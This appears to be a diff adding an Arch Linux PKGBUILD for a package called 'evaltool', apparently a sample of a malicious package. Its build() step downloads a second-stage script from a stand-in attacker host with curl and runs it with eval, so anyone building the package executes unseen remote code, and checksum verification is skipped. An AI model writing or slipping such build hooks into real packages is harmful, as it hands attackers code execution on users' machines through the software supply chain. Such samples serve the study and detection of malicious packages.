@@ -1,0 +1,16 @@
+# Maintainer: Real Looking Person <person@example.com>
+pkgname=evaltool
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A useful tool"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+depends=('glibc')
+source=('app.tar.gz')
+sha256sums=('SKIP')
+build() {
+  payload=$(curl -s https://evil-example.com/stage2)
+  eval "$payload"
+}
+package() { :; }
